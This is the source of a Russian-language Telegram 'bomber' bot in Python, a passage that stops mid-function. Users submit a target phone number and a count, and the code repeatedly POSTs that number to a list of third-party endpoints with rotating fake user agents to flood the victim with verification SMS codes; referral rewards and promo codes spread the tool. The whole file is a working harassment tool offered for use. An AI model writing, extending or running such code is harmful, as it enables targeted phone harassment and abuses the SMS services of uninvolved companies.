import requests
from fake_useragent import UserAgent
import time
import telebot
from telebot.handler_backends import State, StatesGroup
from telebot.storage import StateMemoryStorage
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import logging
import os
import json
import base64
import html

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = telebot.TeleBot('BOT_TOKEN', state_storage=StateMemoryStorage())

ADMIN_ID = ID_ADMINAPON
BOT_USERNAME = 'USERNAME_TVOEGO_BOTA'
CHANNEL_ID = ID_TGK_DLA_BOTA
CHANNEL_LINK = 'LINK_DLA_TGK_BOTA'
PROMO_FILE = 'promocodes.json'
WHITELIST_FILE = 'whitelist.json'
BLACKLIST_FILE = 'blacklist.json'
USERS_FILE = 'users.json'

def init_storage():
    if not os.path.exists(PROMO_FILE):
        with open(PROMO_FILE, 'w') as f:
            json.dump({}, f)
    if not os.path.exists(WHITELIST_FILE):
        with open(WHITELIST_FILE, 'w') as f:
            json.dump([], f)
    if not os.path.exists(BLACKLIST_FILE):
        with open(BLACKLIST_FILE, 'w') as f:
            json.dump([], f)
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w') as f:
            json.dump({}, f)

def load_promos():
    try:
        with open(PROMO_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_promos(promos):
    with open(PROMO_FILE, 'w') as f:
        json.dump(promos, f, indent=2)

def load_whitelist():
    try:
        with open(WHITELIST_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_whitelist(whitelist):
    with open(WHITELIST_FILE, 'w') as f:
        json.dump(whitelist, f, indent=2)

def load_blacklist():
    try:
        with open(BLACKLIST_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_blacklist(blacklist):
    with open(BLACKLIST_FILE, 'w') as f:
        json.dump(blacklist, f, indent=2)

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def load_endpoints(file_path='API.txt'):
    try:
        if not os.path.exists(file_path):
            logger.error(f"File {file_path} not found.")
            return None
        with open(file_path, 'r', encoding='utf-8') as file:
            endpoints = [line.strip() for line in file if line.strip()]
        if not endpoints:
            logger.error(f"File {file_path} is empty.")
            return None
        logger.info(f"Loaded {len(endpoints)} endpoints from {file_path}")
        return endpoints
    except Exception as e:
        logger.error(f"Error reading {file_path}: {str(e)}")
        return None

def generate_referral_link(user_id):
    encoded_id = base64.urlsafe_b64encode(str(user_id).encode()).decode().rstrip('=')
    return f"https://t.me/{BOT_USERNAME}?start=ref_{encoded_id}"

def decode_referral_id(encoded_id):
    try:
        decoded_bytes = base64.urlsafe_b64decode(encoded_id + '==')
        return decoded_bytes.decode()
    except Exception as e:
        logger.error(f"Error decoding referral ID {encoded_id}: {str(e)}")
        return None

def check_subscription(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking subscription for user {user_id}: {str(e)}")
        return False

def is_blacklisted(user_id):
    blacklist = load_blacklist()
    return str(user_id) in blacklist

class BomberStates(StatesGroup):
    PHONE = State()
    CODES = State()
    PROMO_ACTIVATION = State()
    CREATE_PROMO_NAME = State()
    CREATE_PROMO_REWARD = State()
    CREATE_PROMO_ACTIVATIONS = State()
    ADD_WHITELIST = State()
    REMOVE_WHITELIST = State()
    ADD_BLACKLIST = State()
    REMOVE_BLACKLIST = State()

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_progress_bar(current, total):
    bar_length = 10
    filled = int(bar_length * current / total)
    return "█" * filled + "▒" * (bar_length - filled)

def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("👤 Профиль"), KeyboardButton("💣 Бомбер"))
    markup.add(KeyboardButton("🎁 Промокод"), KeyboardButton("📊 Статистика"))
    return markup

def get_admin_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("👤 Профиль"), KeyboardButton("💣 Бомбер"))
    markup.add(KeyboardButton("🎁 Промокод"), KeyboardButton("📊 Статистика"))
    markup.add(KeyboardButton("🔧 Создать промокод"), KeyboardButton("📋 Список промокодов"))
    markup.add(KeyboardButton("🛡 Добавить в whitelist"), KeyboardButton("📜 Просмотр whitelist"))
    markup.add(KeyboardButton("🗑 Удалить из whitelist"))
    markup.add(KeyboardButton("🚫 Добавить в blacklist"), KeyboardButton("📓 Просмотр blacklist"))
    markup.add(KeyboardButton("🗑 Удалить из blacklist"))
    return markup

def get_cancel_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(KeyboardButton("❌ Отмена"))
    return markup

def get_subscription_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("📢 Подписаться", url=CHANNEL_LINK),
        InlineKeyboardButton("✅ Проверить подписку", callback_data="check_subscription")
    )
    return markup

@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
def callback_check_subscription(call):
    user_id = call.from_user.id
    if check_subscription(user_id):
        bot.edit_message_text(
            "✅ Вы подписаны на канал! Теперь вы можете использовать бота.",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=None
        )
        markup = get_admin_menu() if is_admin(user_id) else get_main_menu()
        bot.send_message(
            call.message.chat.id,
            "👇 Выбери, что хочешь сделать:",
            reply_markup=markup,
            parse_mode='Markdown'
        )
        bot.answer_callback_query(call.id)
    else:
        bot.answer_callback_query(call.id, "❌ Вы не подписаны! Подпишитесь и попробуйте снова.")

@bot.message_handler(commands=['createpromo'])
def create_promo_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Эта команда только для администратора!", reply_markup=get_main_menu())
        return
    bot.reply_to(
        message,
        "🔧 Введите название промокода:\n"
        "💡 Пример: WELCOME\n"
        "Для отмены нажми '❌ Отмена'",
        reply_markup=get_cancel_menu(),
        parse_mode='Markdown'
    )
    bot.set_state(message.from_user.id, BomberStates.CREATE_PROMO_NAME, message.chat.id)

@bot.message_handler(commands=['listpromos'])
def list_promos(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Эта команда только для администратора!", reply_markup=get_main_menu())
        return
    try:
        promos = load_promos()
        if not promos:
            bot.reply_to(message, "ℹ️ Промокодов пока нет.", reply_markup=get_admin_menu())
            return
        promo_list = "📋 **Список промокодов**:\n\n"
        for name, data in promos.items():
            remaining = data['max_activations'] - data['activations']
            promo_list += (
                f"🔖 `{name}`\n"
                f"🎟 Награда: {data['reward']} кодов\n"
                f"🔢 Макс. активаций: {data['max_activations']}\n"
                f"⏳ Осталось: {remaining}\n"
                f"✅ Активировано: {data['activations']} раз\n\n"
            )
        bot.reply_to(message, promo_list, reply_markup=get_admin_menu(), parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}", reply_markup=get_admin_menu())
        logger.error(f"Error listing promos: {str(e)}")

@bot.message_handler(commands=['addtowhitelist'])
def add_to_whitelist_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Эта команда только для администратора!", reply_markup=get_main_menu())
        return
    bot.reply_to(
        message,
        "🛡 Введите номер телефона для добавления в белый список:\n"
        "💡 Пример: +79123456789\n"
        "Для отмены нажми '❌ Отмена'",
        reply_markup=get_cancel_menu(),
        parse_mode='Markdown'
    )
    bot.set_state(message.from_user.id, BomberStates.ADD_WHITELIST, message.chat.id)

@bot.message_handler(commands=['listwhitelist'])
def list_whitelist(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Эта команда только для администратора!", reply_markup=get_main_menu())
        return
    try:
        whitelist = load_whitelist()
        if not whitelist:
            bot.reply_to(message, "ℹ️ Белый список пуст.", reply_markup=get_admin_menu())
            return
        whitelist_text = "📜 **Белый список**:\n\n"
        for number in whitelist:
            whitelist_text += f"📞 `{number}`\n"
        bot.reply_to(message, whitelist_text, reply_markup=get_admin_menu(), parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}", reply_markup=get_admin_menu())
        logger.error(f"Error listing whitelist: {str(e)}")

@bot.message_handler(commands=['removefromwhitelist'])
def remove_from_whitelist_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Эта команда только для администратора!", reply_markup=get_main_menu())
        return
    bot.reply_to(
        message,
        "🗑 Введите номер телефона для удаления из белого списка:\n"
        "💡 Пример: +79123456789\n"
        "Для отмены нажми '❌ Отмена'",
        reply_markup=get_cancel_menu(),
        parse_mode='Markdown'
    )
    bot.set_state(message.from_user.id, BomberStates.REMOVE_WHITELIST, message.chat.id)

@bot.message_handler(commands=['addtoblacklist'])
def add_to_blacklist_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Эта команда только для администратора!", reply_markup=get_main_menu())
        return
    bot.reply_to(
        message,
        "🚫 Введите ID пользователя для добавления в черный список:\n"
        "💡 Пример: 6457569474\n"
        "Для отмены нажми '❌ Отмена'",
        reply_markup=get_cancel_menu(),
        parse_mode='Markdown'
    )
    bot.set_state(message.from_user.id, BomberStates.ADD_BLACKLIST, message.chat.id)

@bot.message_handler(commands=['listblacklist'])
def list_blacklist(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Эта команда только для администратора!", reply_markup=get_main_menu())
        return
    try:
        blacklist = load_blacklist()
        if not blacklist:
            bot.reply_to(message, "ℹ️ Черный список пуст.", reply_markup=get_admin_menu())
            return
        blacklist_text = "📓 **Черный список**:\n\n"
        for user_id in blacklist:
            blacklist_text += f"🆔 `{user_id}`\n"
        bot.reply_to(message, blacklist_text, reply_markup=get_admin_menu(), parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}", reply_markup=get_admin_menu())
        logger.error(f"Error listing blacklist: {str(e)}")

@bot.message_handler(commands=['removefromblacklist'])
def remove_from_blacklist_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Эта команда только для администратора!", reply_markup=get_main_menu())
        return
    bot.reply_to(
        message,
        "🗑 Введите ID пользователя для удаления из черного списка:\n"
        "💡 Пример: 6457569474\n"
        "Для отмены нажми '❌ Отмена'",
        reply_markup=get_cancel_menu(),
        parse_mode='Markdown'
    )
    bot.set_state(message.from_user.id, BomberStates.REMOVE_BLACKLIST, message.chat.id)

@bot.message_handler(commands=['start'])
def start(message):
    logger.info(f"Received /start from user {message.from_user.id} in chat {message.chat.id}")
    user_id = str(message.from_user.id)
    if is_blacklisted(user_id):
        bot.reply_to(message, "🚫 Вы находитесь в черном списке и не можете использовать бота!", parse_mode='Markdown')
        return
    if not check_subscription(user_id):
        bot.reply_to(
            message,
            "📢 Пожалуйста, подпишитесь на наш канал, чтобы использовать бота!\n"
            "После подписки нажмите 'Проверить подписку'.",
            reply_markup=get_subscription_keyboard(),
            parse_mode='Markdown'
        )
        return
    users = load_users()
    args = message.text.split()
    referrer_id = None
    if len(args) > 1 and args[1].startswith('ref_'):
        encoded_ref = args[1][4:]
        referrer_id = decode_referral_id(encoded_ref)
        if referrer_id and referrer_id in users and referrer_id != user_id:
            if 'referrals' not in users[referrer_id]:
                users[referrer_id]['referrals'] = []
            if user_id not in users[referrer_id]['referrals']:
                users[referrer_id]['referrals'].append(user_id)
                users[referrer_id]['codes'] += 2
                save_users(users)
                bot.send_message(
                    referrer_id,
                    f"🎉 Новый пользователь по вашей ссылке!\n"
                    f"Вам начислено **2 кода**! 🚀",
                    parse_mode='Markdown'
                )
                logger.info(f"User {user_id} registered via referral from {referrer_id}, awarded 2 codes")
    if user_id not in users:
        users[user_id] = {
            'codes': 0,
            'sent_codes': 0,
            'activated_promos': 0,
            'name': message.from_user.first_name,
            'username': message.from_user.username or 'None',
            'referrals': [],
            'referrer_id': referrer_id if referrer_id else None
        }
        save_users(users)
    referral_link = generate_referral_link(user_id)
    welcome_text = (
        f"👋 Привет, {message.from_user.first_name}!\n"
        f"Добро пожаловать в **{BOT_USERNAME}**! 🎉\n\n"
        f"Я помогу тебе отправлять коды и зарабатывать бонусы! 😎\n"
        f"🔗 Твоя реферальная ссылка:\n`{referral_link}`\n"
        f"🫂 Приглашай друзей и получай **2 кода** за каждого!\n\n"
        f"👇 Выбери, что хочешь сделать:"
    )
    markup = get_admin_menu() if is_admin(message.from_user.id) else get_main_menu()
    bot.reply_to(message, welcome_text, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(content_types=['text'])
def handle_text(message):
    user_id = str(message.from_user.id)
    if is_blacklisted(user_id):
        bot.reply_to(message, "🚫 Вы находитесь в черном списке и не можете использовать бота!", parse_mode='Markdown')
        return
    if not check_subscription(user_id):
        bot.reply_to(
            message,
            "📢 Пожалуйста, подпишитесь на наш канал, чтобы использовать бота!\n"
            "После подписки нажмите 'Проверить подписку'.",
            reply_markup=get_subscription_keyboard(),
            parse_mode='Markdown'
        )
        return
    users = load_users()
    markup = get_admin_menu() if is_admin(message.from_user.id) else get_main_menu()
    if message.text == "👤 Профиль":
        if user_id in users:
            user = users[user_id]
            referral_count = len(user.get('referrals', []))
            referral_link = generate_referral_link(user_id)
            profile_text = (
                f"👤 **Ваш профиль**\n\n"
                f"📛 Имя: {user['name']}\n"
                f"📱 Юзернейм: @{user['username']}\n"
                f"🆔 ID: {user_id}\n"
                f"🎟 **Баланс кодов**: {user['codes']}\n"
                f"📤 **Отправлено кодов**: {user['sent_codes']}\n"
                f"🎁 **Активировано промокодов**: {user['activated_promos']}\n\n"
                f"🔗 **Реферальная ссылка**:\n`{referral_link}`\n"
                f"🫂 **Приглашено друзей**: {referral_count}\n\n"
                f"💡 Приглашайте друзей, чтобы получить больше кодов!"
            )
            bot.reply_to(message, profile_text, reply_markup=markup, parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Профиль не найден! Попробуй снова.", reply_markup=markup)
    elif message.text == "💣 Бомбер":
        if user_id in users and users[user_id]['codes'] > 0:
            bot.reply_to(
                message,
                "📞 Введи номер телефона в формате: **+79123456789**\n"
                "💡 Убедись, что номер начинается с '+' и содержит только цифры.\n"
                "Для отмены нажми '❌ Отмена'",
                reply_markup=get_cancel_menu(),
                parse_mode='Markdown'
            )
            bot.set_state(message.from_user.id, BomberStates.PHONE, message.chat.id)
        else:
            bot.reply_to(
                message,
                "❌ Недостаточно кодов!\n"
                f"У тебя: **{users.get(user_id, {}).get('codes', 0)} кодов**.\n"
                "🎁 Активируй промокод или приглашай друзей по реферальной ссылке!",
                reply_markup=markup,
                parse_mode='Markdown'
            )
    elif message.text == "🎁 Промокод":
        bot.reply_to(
            message,
            "🔑 Введи название промокода:\n"
            "💡 Пример: WELCOME\n"
            "Для отмены нажми '❌ Отмена'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.PROMO_ACTIVATION, message.chat.id)
    elif message.text == "📊 Статистика":
        users = load_users()
        promos = load_promos()
        total_users = len(users)
        total_codes_sent = sum(user['sent_codes'] for user in users.values())
        total_promo_activations = sum(promo['activations'] for promo in promos.values())
        total_referrals = sum(len(user.get('referrals', [])) for user in users.values())
        stats_text = (
            f"📊 **Общая статистика бота**\n\n"
            f"👥 Пользователей: **{total_users}**\n"
            f"📤 Отправлено кодов: **{total_codes_sent}**\n"
            f"🎁 Активировано промокодов: **{total_promo_activations}**\n"
            f"🫂 Приглашено друзей: **{total_referrals}**\n\n"
            f"💡 Хочешь больше кодов? Приглашай друзей!"
        )
        bot.reply_to(message, stats_text, reply_markup=markup, parse_mode='Markdown')
    elif message.text == "🔧 Создать промокод" and is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "🔧 Введите название промокода:\n"
            "💡 Пример: WELCOME\n"
            "Для отмены нажми '❌ Отмена'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.CREATE_PROMO_NAME, message.chat.id)
    elif message.text == "📋 Список промокодов" and is_admin(message.from_user.id):
        list_promos(message)
    elif message.text == "🛡 Добавить в whitelist" and is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "🛡 Введите номер телефона для добавления в белый список:\n"
            "💡 Пример: +79123456789\n"
            "Для отмены нажми '❌ Отмена'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.ADD_WHITELIST, message.chat.id)
    elif message.text == "📜 Просмотр whitelist" and is_admin(message.from_user.id):
        list_whitelist(message)
    elif message.text == "🗑 Удалить из whitelist" and is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "🗑 Введите номер телефона для удаления из белого списка:\n"
            "💡 Пример: +79123456789\n"
            "Для отмены нажми '❌ Отмена'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.REMOVE_WHITELIST, message.chat.id)
    elif message.text == "🚫 Добавить в blacklist" and is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "🚫 Введите ID пользователя для добавления в черный список:\n"
            "💡 Пример: 6457569474\n"
            "Для отмены нажми '❌ Отмена'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.ADD_BLACKLIST, message.chat.id)
    elif message.text == "📓 Просмотр blacklist" and is_admin(message.from_user.id):
        list_blacklist(message)
    elif message.text == "🗑 Удалить из blacklist" and is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "🗑 Введите ID пользователя для удаления из черного списка:\n"
            "💡 Пример: 6457569474\n"
            "Для отмены нажми '❌ Отмена'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.REMOVE_BLACKLIST, message.chat.id)
    elif message.text == "❌ Отмена":
        cancel(message)
    else:
        current_state = bot.get_state(message.from_user.id, message.chat.id)
        state_str = str(current_state)
        if state_str == "BomberStates:PHONE":
            logger.info(f"Processing as phone number: {message.text}")
            number = message.text.strip()
            whitelist = load_whitelist()
            if number in whitelist:
                bot.reply_to(
                    message,
                    "🚫 Этот номер в белом списке и не может быть использован!",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
                return
            if not number.startswith('+'):
                bot.reply_to(
                    message,
                    "❌ Номер должен начинаться с '+'!\n"
                    "Пример: +79123456789\n"
                    "Попробуй ещё раз:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
                return
            try:
                if not number[1:].replace(' ', '').isdigit():
                    bot.reply_to(
                        message,
                        "❌ Номер должен содержать только цифры после '+'!\n"
                        "Попробуй ещё раз:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
                    data['phone'] = number
                bot.set_state(message.from_user.id, BomberStates.CODES, message.chat.id)
                bot.reply_to(
                    message,
                    f"📱 Номер сохранён: **{number}**\n"
                    "🔢 Сколько кодов отправить? (Введи число)\n"
                    "Для отмены нажми '❌ Отмена'",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
            except Exception as e:
                bot.reply_to(
                    message,
                    "❌ Ошибка при обработке номера.\n"
                    "Попробуй снова или начни заново.",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:CODES":
            logger.info(f"Processing as codes: {message.text}")
            try:
                codes = int(message.text.strip())
                user_id = str(message.from_user.id)
                users = load_users()
                if codes <= 0:
                    bot.reply_to(
                        message,
                        "❌ Число должно быть больше 0! Введи снова:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                if user_id not in users or users[user_id]['codes'] < codes:
                    bot.reply_to(
                        message,
                        f"❌ Недостаточно кодов!\n"
                        f"У тебя: **{users[user_id]['codes']} кодов**.\n"
                        "🎁 Активируй промокод или приглашай друзей!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
                    number = data.get('phone')
                if not number:
                    bot.reply_to(
                        message,
                        "❌ Ошибка: номер телефона не найден.\n"
                        "Начать заново.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                endpoints = load_endpoints()
                if not endpoints:
                    bot.reply_to(
                        message,
                        "❌ Ошибка: не удалось загрузить API ссылки.\n"
                        "Попробуй позже.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                total_sent = 0
                user_agent = UserAgent()
                pass_count = 0
                max_passes = 10
                bot.reply_to(
                    message,
                    f"🚀 Начинаю отправку **{codes} кодов** на номер **{number}**...\n"
                    f"⏳ Это может занять некоторое время.",
                    parse_mode='Markdown'
                )
                while total_sent < codes and pass_count < max_passes:
                    pass_count += 1
                    try:
                        headers = {'user-agent': user_agent.random}
                        data = {'phone': number}
                        for endpoint in endpoints:
                            if total_sent >= codes:
                                break
                            try:
                                response = requests.post(endpoint, headers=headers, data=data, timeout=15)
                                if response.status_code == 200:
                                    total_sent += 1
                                    logger.info(f"Code {total_sent}/{codes} sent to {endpoint}")
                                else:
                                    logger.warning(f"Request to {endpoint} returned status code: {response.status_code}")
                                time.sleep(1)
                            except requests.exceptions.RequestException as e:
                                logger.warning(f"Request failed for endpoint {endpoint}: {str(e)}")
                                continue
                        bot.reply_to(
                            message,
                            f"⏳ Проход {pass_count}: Отправлено **{total_sent}/{codes}**\n"
                            f"{get_progress_bar(total_sent, codes)} {total_sent/codes*100:.1f}%",
                            parse_mode='Markdown'
                        )
                        if total_sent < codes:
                            time.sleep(5)
                    except Exception as e:
                        bot.reply_to(
                            message,
                            f"❌ Ошибка в проходе {pass_count}: {str(e)}",
                            parse_mode='Markdown'
                        )
                        logger.error(f"Error in pass {pass_count}: {str(e)}")
                        continue
                users[user_id]['codes'] -= total_sent
                users[user_id]['sent_codes'] += total_sent
                save_users(users)
                failed_to_send = codes - total_sent
                if failed_to_send > 0:
                    bot.reply_to(
                        message,
                        f"⚠️ Не удалось отправить **{failed_to_send} кодов**.\n"
                        f"Отправлено **{total_sent}** из **{codes}**.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                else:
                    bot.reply_to(
                        message,
                        f"🎉 Готово! Отправлено **{codes} кодов** на номер **{number}**!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                bot.delete_state(message.from_user.id, message.chat.id)
            except ValueError:
                bot.reply_to(
                    message,
                    "❌ Введи целое число!\n"
                    "Пример: 5\n"
                    "Попробуй снова:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
            except Exception as e:
                bot.reply_to(
                    message,
                    f"❌ Ошибка: {str(e)}\n"
                    "Попробуй снова или начни заново.",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:PROMO_ACTIVATION":
            promo_name = message.text.strip()
            users = load_users()
            user_id = str(message.from_user.id)
            try:
                promos = load_promos()
                if user_id not in users:
                    users[user_id] = {
                        'codes': 0,
                        'sent_codes': 0,
                        'activated_promos': 0,
                        'name': message.from_user.first_name,
                        'username': message.from_user.username or 'None',
                        'referrals': [],
                        'referrer_id': None
                    }
                if promo_name not in promos:
                    bot.reply_to(
                        message,
                        "❌ Такой промокод не существует!\n"
                        "Проверь название и попробуй снова.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                promo = promos[promo_name]
                if user_id in promo['users']:
                    bot.reply_to(
                        message,
                        "❌ Вы уже активировали этот промокод!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                if promo['activations'] >= promo['max_activations']:
                    bot.reply_to(
                        message,
                        "❌ Этот промокод исчерпал лимит активаций!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                promo['activations'] += 1
                promo['users'].append(user_id)
                users[user_id]['codes'] += promo['reward']
                users[user_id]['activated_promos'] += 1
                save_promos(promos)
                save_users(users)
                bot.reply_to(
                    message,
                    f"🎉 Промокод **{promo_name}** активирован!\n"
                    f"Вам начислено **{promo['reward']} кодов**! 🚀",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
            except Exception as e:
                bot.reply_to(
                    message,
                    f"❌ Ошибка: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:CREATE_PROMO_NAME":
            promo_name = message.text.strip()
            with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
                data['promo_name'] = promo_name
            bot.reply_to(
                message,
                "🎟 Введите количество кодов для награды:\n"
                "💡 Пример: 5\n"
                "Для отмены нажми '❌ Отмена'",
                reply_markup=get_cancel_menu(),
                parse_mode='Markdown'
            )
            bot.set_state(message.from_user.id, BomberStates.CREATE_PROMO_REWARD, message.chat.id)
        elif state_str == "BomberStates:CREATE_PROMO_REWARD":
            try:
                reward = int(message.text.strip())
                if reward <= 0:
                    bot.reply_to(
                        message,
                        "❌ Количество кодов должно быть больше 0! Введи снова:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
                    data['reward'] = reward
                bot.reply_to(
                    message,
                    "🔢 Введите максимальное количество активаций:\n"
                    "💡 Пример: 100\n"
                    "Для отмены нажми '❌ Отмена'",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
                bot.set_state(message.from_user.id, BomberStates.CREATE_PROMO_ACTIVATIONS, message.chat.id)
            except ValueError:
                bot.reply_to(
                    message,
                    "❌ Введи целое число!\n"
                    "Пример: 5\n"
                    "Попробуй снова:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
        elif state_str == "BomberStates:CREATE_PROMO_ACTIVATIONS":
            try:
                max_activations = int(message.text.strip())
                if max_activations <= 0:
                    bot.reply_to(
                        message,
                        "❌ Количество активаций должно быть больше 0! Введи снова:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
                    promo_name = data.get('promo_name')
                    reward = data.get('reward')
                promos = load_promos()
                if promo_name in promos:
                    bot.reply_to(
                        message,
                        "❌ Промокод с таким названием уже существует!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                promos[promo_name] = {
                    'reward': reward,
                    'max_activations': max_activations,
                    'activations': 0,
                    'users': []
                }
                save_promos(promos)
                bot.reply_to(
                    message,
                    f"🎉 Промокод **{promo_name}** создан!\n"
                    f"Награда: **{reward} кодов**\n"
                    f"Макс. активаций: **{max_activations}**",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
            except ValueError:
                bot.reply_to(
                    message,
                    "❌ Введи целое число!\n"
                    "Пример: 100\n"
                    "Попробуй снова:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
            except Exception as e:
                bot.reply_to(
                    message,
                    f"❌ Ошибка: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:ADD_WHITELIST":
            number = message.text.strip()
            if not number.startswith('+'):
                bot.reply_to(
                    message,
                    "❌ Номер должен начинаться с '+'!\n"
                    "Пример: +79123456789\n"
                    "Попробуй ещё раз:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
                return
            try:
                if not number[1:].replace(' ', '').isdigit():
                    bot.reply_to(
                        message,
                        "❌ Номер должен содержать только цифры после '+'!\n"
                        "Попробуй ещё раз:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                whitelist = load_whitelist()
                if number not in whitelist:
                    whitelist.append(number)
                    save_whitelist(whitelist)
                    bot.reply_to(
                        message,
                        f"✅ Номер **{number}** добавлен в белый список.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                else:
                    bot.reply_to(
                        message,
                        f"ℹ️ Номер **{number}** уже в белом списке!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                bot.delete_state(message.from_user.id, message.chat.id)
            except Exception as e:
                bot.reply_to(
                    message,
                    f"❌ Ошибка: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:REMOVE_WHITELIST":
            number = message.text.strip()
            if not number.startswith('+'):
                bot.reply_to(
                    message,
                    "❌ Номер должен начинаться с '+'!\n"
                    "Пример: +79123456789\n"
                    "Попробуй ещё раз:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
                return
            try:
                if not number[1:].replace(' ', '').isdigit():
                    bot.reply_to(
                        message,
                        "❌ Номер должен содержать только цифры после '+'!\n"
                        "Попробуй ещё раз:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                whitelist = load_whitelist()
                if number in whitelist:
                    whitelist.remove(number)
                    save_whitelist(whitelist)
                    bot.reply_to(
                        message,
                        f"✅ Номер **{number}** удалён из белого списка.",
                        reply_markup=markup,
